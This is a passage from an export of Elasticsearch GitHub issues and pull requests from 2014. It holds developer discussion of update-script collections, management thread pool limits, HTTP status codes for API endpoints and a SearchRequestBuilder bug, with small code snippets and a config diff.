</comment><comment author="markharwood" created="2014-11-28T14:30:02Z" id="64899327">Json provides basic structures for representing data (primitives, arrays, objects) but the array elements make no indication of the how the contents are to be managed or accessed (e.g. as a map or a priority queue). 
We don't know what type of collection an array is meant to be unless we start to include extra metadata in our mappings.

Ignoring the lack of specialized collections, the cost of iterating across the elements when applying an update is likely to be lost in the costs involved in the overall update steps involved:
1) seeking to the right place then reading and decompressing the json bytes from disk
2) parsing the contents using a JSON parser
3) applying an update to the relevant array element
4) Feeding the entire updated JSON document back through the tokenization process
5) Writing a brand new version of the whole document to disk.

By introducing specialized collections we are only talking about optimizing step 3 here but all the other steps are still directly related to the size of your documents and likely to be a concern.

While performance may remain a concern, the complexity of update scripts could be reduced if we provide utility classes for managing common collections (e.g. PriorityQueues) which can serialize and deserialize to JSON representations. Here is a simple example Groovy function to turn what was a JSON-stored array into a map to make applying updates simpler:

```
// Convert basic array into map for ease of manipulation 
vendorMap = doc.vendorSummaries.collectEntries{[it.vendorName, it]};
```

Note that I take the "vendorName" of each object in the array here and turn that into the key used in the Map. We can then refer to map elements directly by name when applying updates.

The reason I think having access to collections like PriorityQueues and perhaps HyperLogLog type structures are important is that they are the means of defence from having documents that get too big in the first place - for popular bank accounts we don't have to remember every customer they have transacted with and maybe a fuzzy-counting collection is a more appropriate strategy than a JSON doc that expands into gigabytes of content (this scenario happened to one of our users!).

If we start to have some of these smarter collections we move to a situation where the JSON we persist perhaps contains a mix of both public and private elements - public content that is meaningful/searchable and displayable to end users and "private" variables that are internals essential to the deserialization of specialized collections e.g. the "countOfCustomers" field a bank account maintains may be a public integer but privately holds a serialized HyperLogLog structure required to compute and maintain this count-distinct value.
</comment><comment author="clintongormley" created="2014-11-28T15:17:08Z" id="64903752">I compared two update scripts, one using a list with `.contains()` and one using a set of unique values.  I ran 1,000 updates with each script, adding 2, 20, 50, and 100 random numbers between 1..100,000 each time.

```
        List    Set     Unique vals
2       3.7s    3.4s    ~2k
20      21s     21s     ~18k
50      52s     50s     ~39k
100    108s    101s     ~63k
```

In other words, Set is slightly faster than List, but you have to have a lot of values in the array before it makes a big difference.
</comment><comment author="clintongormley" created="2015-11-21T17:13:32Z" id="158662805">Closing as won't fix
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Auto create index to keep around headers and context of the request that caused it</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7331</link><project id="" key="" /><description /><key id="40567232">7331</key><summary>Auto create index to keep around headers and context of the request that caused it</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/javanna/following{/other_user}', u'events_url': u'https://api.github.com/users/javanna/events{/privacy}', u'organizations_url': u'https://api.github.com/users/javanna/orgs', u'url': u'https://api.github.com/users/javanna', u'gists_url': u'https://api.github.com/users/javanna/gists{/gist_id}', u'html_url': u'https://github.com/javanna', u'subscriptions_url': u'https://api.github.com/users/javanna/subscriptions', u'avatar_url': u'https://avatars1.githubusercontent.com/u/832460?v=4', u'repos_url': u'https://api.github.com/users/javanna/repos', u'received_events_url': u'https://api.github.com/users/javanna/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/javanna/starred{/owner}{/repo}', u'site_admin': False, u'login': u'javanna', u'type': u'User', u'id': 832460, u'followers_url': u'https://api.github.com/users/javanna/followers'}</assignee><reporter username="">javanna</reporter><labels><label>:Internal</label><label>enhancement</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-19T08:09:50Z</created><updated>2015-06-07T12:21:25Z</updated><resolved>2014-08-19T15:04:37Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="spinscale" created="2014-08-19T14:29:31Z" id="52642235">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Update InternalSearchHit.java</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7330</link><project id="" key="" /><description>Add support for removing meta data from search result
</description><key id="40563641">7330</key><summary>Update InternalSearchHit.java</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">kuseman</reporter><labels><label>discuss</label></labels><created>2014-08-19T07:08:31Z</created><updated>2014-08-23T14:30:42Z</updated><resolved>2014-08-22T11:03:07Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-08-19T11:34:05Z" id="52620802">Hi @kuseman 

Thanks for the PR.  This wouldn't solve one of the big reasons for#2149 as it still includes the `took` key in the response, which can vary with every request.  

We had decided against supporting this option, but have reopened #2149 after your request to do so.  We will discuss again and get back to you.
</comment><comment author="kuseman" created="2014-08-19T11:41:47Z" id="52621634">Ah ok, maybe this PL shouldn't be connected to 2149 but rather a new issue.
</comment><comment author="clintongormley" created="2014-08-22T11:03:07Z" id="53048220">Hi @kuseman 

We're keen to provide a more generic solution which people can bend to their needs. I've opened this issue about it https://github.com/elasticsearch/elasticsearch/issues/7401

thanks for sending the PR, but I'm going to close this issue in favour of #7401
</comment><comment author="kuseman" created="2014-08-23T14:30:42Z" id="53154435">Seems legit, good proposal with transform script, like it.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Test: Only reset clients on nightly tests</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7329</link><project id="" key="" /><description>resetting the clients on each test (in after test) makes the tests running, especially in network mode, much slower, since transport client needs to be created each time when randmized to be used. Also, on OSX, the excessive connections causes bind exceptions eventually which makes running the network tests much harder on it.
</description><key id="40561355">7329</key><summary>Test: Only reset clients on nightly tests</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">kimchy</reporter><labels><label>test</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-19T06:22:16Z</created><updated>2015-06-07T11:46:37Z</updated><resolved>2014-08-21T15:37:18Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-08-21T08:10:23Z" id="52890574">LGTM - one small comment, I think we can randomly close the client `sometimes` but very rarely instead of doing it all the time during nightly?
</comment><comment author="kimchy" created="2014-08-21T14:30:26Z" id="52927680">@s1monw ++, will add the rarely part and push
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Upgrade to Netty 3.9.3.Final</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7328</link><project id="" key="" /><description /><key id="40554447">7328</key><summary>Upgrade to Netty 3.9.3.Final</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">kimchy</reporter><labels><label>:Network</label><label>upgrade</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-19T03:11:55Z</created><updated>2015-08-25T13:25:43Z</updated><resolved>2014-08-19T18:10:09Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="spinscale" created="2014-08-19T09:06:46Z" id="52607846">LGTM, [changelog](http://netty.io/news/2014/08/06/3-9-3-Final.html) looks good as well
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Upgrade to Jackson Smile 2.4.1.1</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7327</link><project id="" key="" /><description>This fixes issue 18 in Smile (FasterXML/jackson-dataformat-smile#18)
</description><key id="40548123">7327</key><summary>Upgrade to Jackson Smile 2.4.1.1</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">kimchy</reporter><labels><label>:Core</label><label>bug</label><label>upgrade</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-19T00:52:28Z</created><updated>2015-08-25T13:25:43Z</updated><resolved>2014-08-19T18:11:27Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="bleskes" created="2014-08-19T07:35:41Z" id="52599688">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Warmer (search) to support query cache</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7326</link><project id="" key="" /><description>allow for search based warmer to support query cache flag on the search request, and use the index level query caching flag if set.
 Note, this change required changing the logic in warmer, to pass the actual searcher that will be used on for the actual search requests to the warmers. This changes the previous behavior of only using readers that were not warmed during merges, or already around. This change simplifies the warmer code significantly, and the overhead will be very small for existing warmed readers (like after a merge), yet allow us to implement warmers like the query cache (and actually have a cleaner contract, "same as search").
</description><key id="40545700">7326</key><summary>Warmer (search) to support query cache</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">kimchy</reporter><labels><label>:Cache</label><label>enhancement</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-19T00:02:03Z</created><updated>2015-06-07T12:21:51Z</updated><resolved>2014-08-20T16:31:59Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="kimchy" created="2014-08-19T00:03:30Z" id="52573748">@jpountz hey, would for you to look at this, since in order to change that, I ended up changing the warmer logic in which searcher to provide.
</comment><comment author="jpountz" created="2014-08-19T08:25:23Z" id="52603883">I am worried that this might have significant impact on users who have large shards/lots of warmer queries/complex warmer queries? I wouldn't be surprised that warmer queries often use a `match_all` query, and in such a case the warmer would need to collect _every_ document on every _every_ refresh while most of time there is just a new smallish NRT segment?
</comment><comment author="jpountz" created="2014-08-20T13:42:34Z" id="52779262">LGTM, I just left minor (costmetics) comments
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>_scripts end point does not return a request body for 404 responses</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7325</link><project id="" key="" /><description>Tested against both indexed scripts and indexed search templates in 1.3.1:

A HTTP GET to fetch back a non-existing script or search template returns an empty HTTP body with a HTTP header (404):

```
_scripts/groovy/asdasdasfe
_search/template/asdasdasdas
```

Would be nice to return an actual HTTP body to be consistent with our other APIs.  Perhaps something like the following?

```
{
  "status" : 404,
  "error" : "IndexedScriptMissingException[[asdasdasfe] missing]"
}
{
  "status" : 404,
  "error" : "IndexedSearchTemplateMissingException[[asdasdasdas] missing]"
}
```
</description><key id="40545198">7325</key><summary>_scripts end point does not return a request body for 404 responses</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/javanna/following{/other_user}', u'events_url': u'https://api.github.com/users/javanna/events{/privacy}', u'organizations_url': u'https://api.github.com/users/javanna/orgs', u'url': u'https://api.github.com/users/javanna', u'gists_url': u'https://api.github.com/users/javanna/gists{/gist_id}', u'html_url': u'https://github.com/javanna', u'subscriptions_url': u'https://api.github.com/users/javanna/subscriptions', u'avatar_url': u'https://avatars1.githubusercontent.com/u/832460?v=4', u'repos_url': u'https://api.github.com/users/javanna/repos', u'received_events_url': u'https://api.github.com/users/javanna/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/javanna/starred{/owner}{/repo}', u'site_admin': False, u'login': u'javanna', u'type': u'User', u'id': 832460, u'followers_url': u'https://api.github.com/users/javanna/followers'}</assignee><reporter username="">ppf2</reporter><labels><label>:Indexed Scripts/Templates</label><label>enhancement</label><label>v1.6.0</label><label>v2.0.0-beta1</label></labels><created>2014-08-18T23:53:32Z</created><updated>2015-04-08T09:02:13Z</updated><resolved>2015-04-08T09:02:13Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="GaelTadh" created="2014-08-19T08:29:52Z" id="52604253">Agreed, I'll target this for 1.4 and talk about backporting it to 1.3.x
</comment><comment author="javanna" created="2015-04-02T14:52:39Z" id="88934973">Rather than returning an error, we should return simlar content as what the get api returns. This is the approach taken in #10396. We make sure that a body is always returned, whcih always contains metadata info and the found boolean flag.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>status API endpoints return 404 on success</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7324</link><project id="" key="" /><description>I'm trying to find the correct endpoint to use for HAProxy http checks of our non-data nodes. While doing so, I discovered that endpoints such as `_cluster/health`, `_status` and `_recovery` all return a 404 HTTP response code, even when they succeed in returning data. Ironically, when a request is made using a URI that is not handled, elasticsearch returns a "200 OK" response code.

For instance, assuming we have an index named "my-data",

```
curl -H "Accept: application/json" http://my-data001:9200/_cluster/health
... much json about our cluster

curl -H "Accept: application/json" http://my-data001:9200/_cluster/health -I
HTTP/1.1 404 Not Found
Content-Type: text/plain; charset=UTF-8
Content-Length: 0

curl -H "Accept: application/json" http://my-data001:9200/my-data
No handler found for uri [/my-data] and method [GET]

curl -H "Accept: application/json" http://my-data001:9200/my-data -I
HTTP/1.1 200 OK
Content-Type: text/plain; charset=UTF-8
Content-Length: 0
```

While fixing this might not solve my original problem, it is extremely confusing. 
</description><key id="40534782">7324</key><summary>status API endpoints return 404 on success</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">sax</reporter><labels /><created>2014-08-18T21:36:52Z</created><updated>2014-08-18T21:54:35Z</updated><resolved>2014-08-18T21:54:35Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="sax" created="2014-08-18T21:54:35Z" id="52561040">Ok. Looks like this is because curl with -I switches the verb to HEAD unless specified otherwise. If I force it back to GET I get an expected response

```
curl http://my-data001:9200/_cat/recovery/my-data -I -XGET
HTTP/1.1 200 OK
Content-Type: text/plain; charset=UTF-8
Content-Length: 8448

```
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>DistributorDirectory shouldn't search for directory when reading existing file</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7323</link><project id="" key="" /><description>I just changed the logic in the private getDirectory() to only call distributor.any() if there wasn't already a binding for the requested file name.

Closes #7306
</description><key id="40531453">7323</key><summary>DistributorDirectory shouldn't search for directory when reading existing file</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">mikemccand</reporter><labels><label>:Store</label><label>bug</label><label>v1.3.3</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-18T20:59:20Z</created><updated>2015-06-07T12:22:36Z</updated><resolved>2014-08-19T12:55:49Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="bleskes" created="2014-08-19T07:54:03Z" id="52601143">LGTM. Just needs some labels..
</comment><comment author="mikemccand" created="2014-08-19T12:42:37Z" id="52627182">Thanks @bleskes I'll commit ... on the labels, I think we are only supposed to label either the issue or the PR but not both, else it causes confusion when generating release notes?  I labeled the issue (#7306) in this case ... though I should have put the review label on this one.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Fix NPE in SnapshotsService on node shutdown</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7322</link><project id="" key="" /><description>Fixes #6506
</description><key id="40528287">7322</key><summary>Fix NPE in SnapshotsService on node shutdown</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">imotov</reporter><labels><label>:Snapshot/Restore</label><label>bug</label><label>v1.3.3</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-18T20:29:58Z</created><updated>2015-06-07T19:06:52Z</updated><resolved>2014-08-20T00:00:47Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="martijnvg" created="2014-08-19T13:05:45Z" id="52630132">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Add Java API example for storing search templates in .scripts</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7321</link><project id="" key="" /><description>Would be nice to provide a Java API example for storing search templates in the .scripts index. 

Here is an example:

``` java
import org.elasticsearch.action.indexedscripts.put.PutIndexedScriptResponse;
import org.elasticsearch.script.ScriptService;

import java.util.HashMap;
import java.util.Map;

            PutIndexedScriptResponse scriptResponse = client.preparePutIndexedScript("mustache", "mysearchtemplate",
                    "{" +
                    "\"template\":{" +
                        "\"query\":{" +
                            "\"match\":{" +
                                "\"comments\" : \"{{query_string}}\"}" +
                            "}" +
                        "}" +
                    "}").get();
            Map&lt;String, String&gt; template_params = new HashMap&lt;String, String&gt;();
            template_params.put("query_string", "some_text");
            SearchResponse searchResponse = client.prepareSearch("my_index").setTypes("my_type").
                    setTemplateName("mysearchtemplate").setTemplateType(ScriptService.ScriptType.INDEXED).setTemplateParams(template_params).get();
```
</description><key id="40526975">7321</key><summary>Add Java API example for storing search templates in .scripts</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/dadoonet/following{/other_user}', u'events_url': u'https://api.github.com/users/dadoonet/events{/privacy}', u'organizations_url': u'https://api.github.com/users/dadoonet/orgs', u'url': u'https://api.github.com/users/dadoonet', u'gists_url': u'https://api.github.com/users/dadoonet/gists{/gist_id}', u'html_url': u'https://github.com/dadoonet', u'subscriptions_url': u'https://api.github.com/users/dadoonet/subscriptions', u'avatar_url': u'https://avatars3.githubusercontent.com/u/274222?v=4', u'repos_url': u'https://api.github.com/users/dadoonet/repos', u'received_events_url': u'https://api.github.com/users/dadoonet/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/dadoonet/starred{/owner}{/repo}', u'site_admin': False, u'login': u'dadoonet', u'type': u'User', u'id': 274222, u'followers_url': u'https://api.github.com/users/dadoonet/followers'}</assignee><reporter username="">ppf2</reporter><labels><label>docs</label><label>enhancement</label></labels><created>2014-08-18T20:16:33Z</created><updated>2014-12-03T15:46:42Z</updated><resolved>2014-12-03T15:46:42Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments /><attachments /><subtasks /><customfields /></item><item><title>Switch to fixed thread pool by default for management threads</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7320</link><project id="" key="" /><description>Switch management threads to a fixed thread pool with up to 5 threads, and queue size of 100 by default, after which excess incoming requests are rejected.

Closes #7318
</description><key id="40524105">7320</key><summary>Switch to fixed thread pool by default for management threads</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">mikemccand</reporter><labels><label>:Internal</label><label>enhancement</label><label>v1.3.3</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-18T19:43:21Z</created><updated>2015-06-07T12:22:45Z</updated><resolved>2014-08-18T19:47:27Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="kimchy" created="2014-08-18T19:44:03Z" id="52544198">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Make sure that all shard level requests hold the original indices</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7319</link><project id="" key="" /><description>A request that relates to indices (`IndicesRequest` or `CompositeIndicesRequest`) might be converted to some other internal request(s) (e.g. shard level request) that get distributed over the cluster. Those requests contain the concrete index they refer to, but it is not known which indices (or aliases or expressions) the original request related to.

This commit makes sure that the original indices are available as part of the shard level requests and makes them implement `IndicesRequest` as well.

Also every internal request should be created passing in the original request, so that the original headers, together with the eventual original indices and options, get copied to it. Corrected some places where this information was lost.

NOTE: As for the bulk api and other multi items api (e.g. multi_get), their shard level requests won't keep around the whole set of original indices, but only the ones that related to the bulk items sent to each shard, the important bit is that we keep the original names though, not only the concrete ones.
</description><key id="40517766">7319</key><summary>Make sure that all shard level requests hold the original indices</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/javanna/following{/other_user}', u'events_url': u'https://api.github.com/users/javanna/events{/privacy}', u'organizations_url': u'https://api.github.com/users/javanna/orgs', u'url': u'https://api.github.com/users/javanna', u'gists_url': u'https://api.github.com/users/javanna/gists{/gist_id}', u'html_url': u'https://github.com/javanna', u'subscriptions_url': u'https://api.github.com/users/javanna/subscriptions', u'avatar_url': u'https://avatars1.githubusercontent.com/u/832460?v=4', u'repos_url': u'https://api.github.com/users/javanna/repos', u'received_events_url': u'https://api.github.com/users/javanna/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/javanna/starred{/owner}{/repo}', u'site_admin': False, u'login': u'javanna', u'type': u'User', u'id': 832460, u'followers_url': u'https://api.github.com/users/javanna/followers'}</assignee><reporter username="">javanna</reporter><labels><label>:Internal</label><label>enhancement</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-18T18:35:39Z</created><updated>2015-06-07T12:23:01Z</updated><resolved>2014-08-20T19:06:33Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-08-20T09:11:52Z" id="52751627">I added some minor comments. I think it's very close! 
</comment><comment author="javanna" created="2014-08-20T10:14:21Z" id="52757075">Updated according to feedback, ready for another review round
</comment><comment author="s1monw" created="2014-08-20T14:41:28Z" id="52787600">this LGTM thanks luca
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Internal: Management thread pool should reject requests when there are too many</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7318</link><project id="" key="" /><description>Today, the management thread pool (used by stats and cats) is bounded to 5, but it still accepts further requests, and then waits indefinitely for a thread to free up.

This is dangerous because node stats can be a somewhat costly operation (in proportion to number of shards on the node)....

And it confounds debugging, because it can cause loooong hangs in e.g. node stats requests via browser/curl, and it also is not graceful for recovering from "too many management requests" overload.

If we instead rejected the request it would make it clearer which clients are causing too much load.
</description><key id="40512476">7318</key><summary>Internal: Management thread pool should reject requests when there are too many</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">open</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/bleskes/following{/other_user}', u'events_url': u'https://api.github.com/users/bleskes/events{/privacy}', u'organizations_url': u'https://api.github.com/users/bleskes/orgs', u'url': u'https://api.github.com/users/bleskes', u'gists_url': u'https://api.github.com/users/bleskes/gists{/gist_id}', u'html_url': u'https://github.com/bleskes', u'subscriptions_url': u'https://api.github.com/users/bleskes/subscriptions', u'avatar_url': u'https://avatars1.githubusercontent.com/u/1006375?v=4', u'repos_url': u'https://api.github.com/users/bleskes/repos', u'received_events_url': u'https://api.github.com/users/bleskes/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/bleskes/starred{/owner}{/repo}', u'site_admin': False, u'login': u'bleskes', u'type': u'User', u'id': 1006375, u'followers_url': u'https://api.github.com/users/bleskes/followers'}</assignee><reporter username="">mikemccand</reporter><labels><label>:Internal</label><label>discuss</label><label>enhancement</label></labels><created>2014-08-18T17:38:31Z</created><updated>2016-11-25T18:32:00Z</updated><resolved /><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="nik9000" created="2014-08-18T17:39:38Z" id="52527190">+1
</comment><comment author="kevinkluge" created="2014-08-18T18:42:19Z" id="52536171">I assume we'd add a configurable queue size and reject when the queue is full.  I like the idea; it would help debugging cases where management tools are loading the server.
</comment><comment author="kimchy" created="2014-08-18T18:44:16Z" id="52536461">the scaling thread pool today doesn't support rejection based on queue size (just an FYI). We can try and add this support, can be a bit tricky since it relies on rejection to add a thread or not. I think potentially the simplest solution is to make it fixed with a bounded queue size?
</comment><comment author="mikemccand" created="2014-08-18T18:54:24Z" id="52537803">Fixed with bounded queue size sounds like a good compromise; I'll try to take a stab at this.
</comment><comment author="mikemccand" created="2014-08-18T19:20:13Z" id="52541126">OK all I changed was this:

```
diff --git a/src/main/java/org/elasticsearch/threadpool/ThreadPool.java b/src/main/java/org/elasticsearch/threadpool/ThreadPool.java
index 0152c0e..19692e6 100644
--- a/src/main/java/org/elasticsearch/threadpool/ThreadPool.java
+++ b/src/main/java/org/elasticsearch/threadpool/ThreadPool.java
@@ -119,7 +119,7 @@ public class ThreadPool extends AbstractComponent {
                 .put(Names.SEARCH, settingsBuilder().put("type", "fixed").put("size", availableProcessors * 3).put("queue_size", 1000).build())
                 .put(Names.SUGGEST, settingsBuilder().put("type", "fixed").put("size", availableProcessors).put("queue_size", 1000).build())
                 .put(Names.PERCOLATE, settingsBuilder().put("type", "fixed").put("size", availableProcessors).put("queue_size", 1000).build())
-                .put(Names.MANAGEMENT, settingsBuilder().put("type", "scaling").put("keep_alive", "5m").put("size", 5).build())
+                .put(Names.MANAGEMENT, settingsBuilder().put("type", "fixed").put("size", availableProcessors).put("queue_size", 100).build())
                 .put(Names.FLUSH, settingsBuilder().put("type", "scaling").put("keep_alive", "5m").put("size", halfProcMaxAt5).build())
                 .put(Names.MERGE, settingsBuilder().put("type", "scaling").put("keep_alive", "5m").put("size", halfProcMaxAt5).build())
                 .put(Names.REFRESH, settingsBuilder().put("type", "scaling").put("keep_alive", "5m").put("size", halfProcMaxAt10).build())
```

But just to confirm: if the backlog tries to exceed 100 then ES will throw EsRejectedExecutionExc back to the client?  Looks like it will, because EsExecutors.newFixed passes new EsAbortPolicy()...
</comment><comment author="kimchy" created="2014-08-18T19:22:15Z" id="52541400">@mikemccand correct, changing to fix with bounded queue will cause rejections to be thrown. I think that availableProcessors as the value for the thread pool is too big, specifically for beefy machines, I would put there `Math.min(5, avaiableProcessors)`?, I think 5 threads should be enough, otherwise the operation is just too heavy and its a bug, a stats call should not be heavy (like using the usable space on file length issue).
</comment><comment author="mikemccand" created="2014-08-18T19:35:49Z" id="52543145">OK, thanks @kimchy I'll switch to min(5, availableProcessors).
</comment><comment author="kimchy" created="2014-08-18T19:40:15Z" id="52543727">ahh, we already have `halfProcMaxAt5`, maybe just use that one?
</comment><comment author="mikemccand" created="2014-08-18T19:40:53Z" id="52543798">Ahh super.
</comment><comment author="mikemccand" created="2014-09-30T09:02:58Z" id="57285677">I've reverted this change, since it causes https://github.com/elasticsearch/elasticsearch/issues/7916 ...
</comment><comment author="bleskes" created="2015-11-04T12:23:44Z" id="153703820">we should probably revisit this now that we have a different execution model for indices stats etc (#7990) . Reopening ....
</comment><comment author="clintongormley" created="2016-11-25T18:32:00Z" id="263008776">@jasontedor may be of interest to you?</comment></comments><attachments /><subtasks /><customfields /></item><item><title>SearchRequestBuilder.toString modifies the SearchRequestBuilder wiping any source set.</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7317</link><project id="" key="" /><description>If you use setSource on a SearchRequestBuilder and then call to string the SearchRequest will appear to be cleared. 

```
SearchRequestBuilder srb = client().prepareSearch().setSource("{\"query\":\"match\":{\"foo\":\"bar\"}}");
srb.execute().get();
```

Will execute the correct search, however 

```
SearchRequestBuilder srb = client().prepareSearch().setSource("{\"query\":\"match\":{\"foo\":\"bar\"}}");
logger.debug("About to execute [{}]",srb.toString());
srb.execute().get();
```

Will execute an empty search. 

The problem is that `toString()` calls `internalBuilder()` which calls `sourceBuilder()` 

```
    private SearchSourceBuilder sourceBuilder() {
        if (sourceBuilder == null) {
            sourceBuilder = new SearchSourceBuilder();
        }
        return sourceBuilder;
    }
```

Then when the `SearchRequestBuilder.execute` is called the request that was constructed via `setSource` is replaced by an empty sourceBuilder.

```
    @Override
    protected void doExecute(ActionListener&lt;SearchResponse&gt; listener) {
        if (sourceBuilder != null) {
            request.source(sourceBuilder());
        }
        client.search(request, listener);
    }
```
</description><key id="40500407">7317</key><summary>SearchRequestBuilder.toString modifies the SearchRequestBuilder wiping any source set.</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/GaelTadh/following{/other_user}', u'events_url': u'https://api.github.com/users/GaelTadh/events{/privacy}', u'organizations_url': u'https://api.github.com/users/GaelTadh/orgs', u'url': u'https://api.github.com/users/GaelTadh', u'gists_url': u'https://api.github.com/users/GaelTadh/gists{/gist_id}', u'html_url': u'https://github.com/GaelTadh', u'subscriptions_url': u'https://api.github.com/users/GaelTadh/subscriptions', u'avatar_url': u'https://avatars1.githubusercontent.com/u/5190064?v=4', u'repos_url': u'https://api.github.com/users/GaelTadh/repos', u'received_events_url': u'https://api.github.com/users/GaelTadh/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/GaelTadh/starred{/owner}{/repo}', u'site_admin': False, u'login': u'GaelTadh', u'type': u'User', u'id': 5190064, u'followers_url': u'https://api.github.com/users/GaelTadh/followers'}</assignee><reporter username="">GaelTadh</reporter><labels><label>bug</label></labels><created>2014-08-18T15:30:26Z</created><updated>2015-02-27T21:37:20Z</updated><resolved>2015-02-27T21:37:20Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="javanna" created="2015-02-27T21:37:20Z" id="76476413">Closing as duplicate of #5576
